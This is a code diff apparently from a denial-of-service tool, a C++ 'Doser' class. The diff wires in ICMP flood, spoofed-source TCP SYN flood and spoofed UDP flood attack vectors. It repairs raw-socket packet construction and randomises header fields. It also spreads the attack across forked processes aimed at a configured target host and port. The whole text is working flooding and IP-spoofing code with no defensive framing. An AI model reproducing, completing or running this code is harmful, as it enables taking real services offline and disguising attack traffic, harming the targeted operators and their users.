@@ -15,9 +15,6 @@
 
 
 void Doser::attack(const int *id){
-    if(conf->vector == config::ICMPFlood){
-        icmp_flood(id);
-    }
     int x, r;
     std::vector<int> sockets;
     std::vector<bool> packets;
@@ -182,6 +179,15 @@ void Doser::run() {
         case config::Slowloris:
             logger->Log("Attack Vector: Slowloris", Logger::Info);
             break;
+        case config::ICMPFlood:
+            logger->Log("Attack Vector: ICMP Flood", Logger::Info);
+            break;
+        case config::SpoofedTCP:
+            logger->Log("Attack Vector: Spoofed TCP", Logger::Info);
+            break;
+        case config::SpoofedUDP:
+            logger->Log("Attack Vector: Spoofed UDP", Logger::Info);
+            break;
         default:break;
     }
     if(conf->UseSSL){
@@ -198,8 +204,29 @@ void Doser::run() {
     for (int x = 0; x < conf->THREADS; x++) {
         switch (fork()){
             case 0:break;
-            default:
-                attack(&x);
+            default:{
+                switch (conf->vector){
+                    case config::HTTP:
+                    case config::NullUDP:
+                    case config::NullTCP:
+                    case config::TCPFlood:
+                    case config::UDPFlood:
+                        attack(&x);
+                        break;
+                    case config::SpoofedTCP:
+                        spoofed_tcp_flood(&x);
+                        break;
+                    case config::SpoofedUDP:
+                        spoofed_udp_flood(&x);
+                        break;
+                    case config::ICMPFlood:
+                        icmp_flood(&x);
+                        break;
+                    default:
+                        attack(&x);
+                }
+            }
+
         }
         usleep(200000);
     }
@@ -358,7 +385,7 @@ void Doser::icmp_flood(const int *id) {
     while(true){
         for(x = 0;x < conf->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
-            if((s = socket(AF_UNSPEC, SOCK_RAW, IPPROTO_RAW)) < 0){
+            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
                 logger->Log("socket() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
@@ -383,10 +410,10 @@ void Doser::icmp_flood(const int *id) {
 
             // IP Struct
             ip->ip_v = 4;
-            ip->ip_hl = sizeof*ip >> 2;
+            ip->ip_hl = 5;
             ip->ip_tos = 0;
             ip->ip_len = htons(sizeof(buf));
-            ip->ip_id = htons(4321);
+            ip->ip_id = static_cast<u_short>(randomInt(1, 1000));
             ip->ip_off = htons(0x0);
             ip->ip_ttl = 255;
             ip->ip_p = 1;
@@ -395,7 +422,7 @@ void Doser::icmp_flood(const int *id) {
             dst.sin_addr = ip->ip_dst;
             dst.sin_family = AF_UNSPEC;
             icmp->type = ICMP_ECHO;
-            icmp->code = 0;
+            icmp->code = static_cast<u_int8_t>(randomInt(1, 1000));
             icmp->checksum = htons(checksum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));
             if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
                 logger->Log("sendto() error", Logger::Error);
@@ -442,60 +469,37 @@ void Doser::spoofed_tcp_flood(const int *id) {
             }
 
             sin.sin_family = AF_UNSPEC;
-
             din.sin_family = AF_UNSPEC;
             sin.sin_port = htons(static_cast<uint16_t>(s_port));
-
             din.sin_port = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-
-
             sin.sin_addr.s_addr = inet_addr(s_addr);
-
             din.sin_addr.s_addr = inet_addr(conf->website.c_str());
 
+            // IP Struct
             ip->iph_ihl = 5;
-
             ip->iph_ver = 4;
-
             ip->iph_tos = 16;
-
             ip->iph_len = sizeof(struct ipheader) + sizeof(struct tcpheader);
-
             ip->iph_ident = htons(54321);
-
             ip->iph_offset = 0;
-
             ip->iph_ttl = 64;
-
-            ip->iph_protocol = 6; // TCP
-
-            ip->iph_chksum = 0; // Done by kernel
-
+            ip->iph_protocol = 6;
+            ip->iph_chksum = 0;
             ip->iph_sourceip = inet_addr(s_addr);
-
-
             ip->iph_destip = inet_addr(conf->website.c_str());
+
+            // TCP Struct
             tcp->tcph_srcport = htons(static_cast<uint16_t>(s_port));
-
             tcp->tcph_destport = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-
             tcp->tcph_seqnum = htonl(1);
-
             tcp->tcph_acknum = 0;
-
             tcp->tcph_offset = 5;
-
             tcp->tcph_syn = 1;
-
             tcp->tcph_ack = 0;
-
             tcp->tcph_win = htons(32767);
-
-            tcp->tcph_chksum = 0; // Done by kernel
-
+            tcp->tcph_chksum = 0;
             tcp->tcph_urgptr = 0;
             ip->iph_chksum = checksum((unsigned short *) buffer, (sizeof(struct ipheader) + sizeof(struct tcpheader)));
-            // Inform the kernel do not fill up the headers' structure, we fabricated our own
             if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
@@ -535,53 +539,29 @@ void Doser::spoofed_udp_flood(const int *id) {
             }
 
             sin.sin_family = AF_UNSPEC;
-
             din.sin_family = AF_UNSPEC;
             sin.sin_port = htons(static_cast<uint16_t>(s_port));
-
             din.sin_port = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-
-            // Source IP, can be any, modify as needed
-
             sin.sin_addr.s_addr = inet_addr(s_addr);
-
             din.sin_addr.s_addr = inet_addr(conf->website.c_str());
 
+            // IP Struct
             ip->iph_ihl = 5;
-
             ip->iph_ver = 4;
-
-            ip->iph_tos = 16; // Low delay
-
+            ip->iph_tos = 16;
             ip->iph_len = sizeof(struct ipheader) + sizeof(struct udpheader);
-
             ip->iph_ident = htons(54321);
-
-            ip->iph_ttl = 64; // hops
-
-            ip->iph_protocol = 17; // UDP
-
-
+            ip->iph_ttl = 64;
+            ip->iph_protocol = 17;
             ip->iph_sourceip = inet_addr(s_addr);
-
-            // The destination IP address
-
             ip->iph_destip = inet_addr(conf->website.c_str());
 
-
+            // UDP Struct
             udp->udph_srcport = htons(static_cast<uint16_t>(s_port));
-
-            // Destination port number
-
             udp->udph_destport = htons(*(unsigned short *)conf->port.c_str());
-
             udp->udph_len = htons(sizeof(struct udpheader));
 
-            // Calculate the checksum for integrity
-
             ip->iph_chksum = checksum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
-
-            // Inform the kernel do not fill up the packet structure. we will build our own...
 
             if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                 logger->Log("setsockopt() error", Logger::Error);
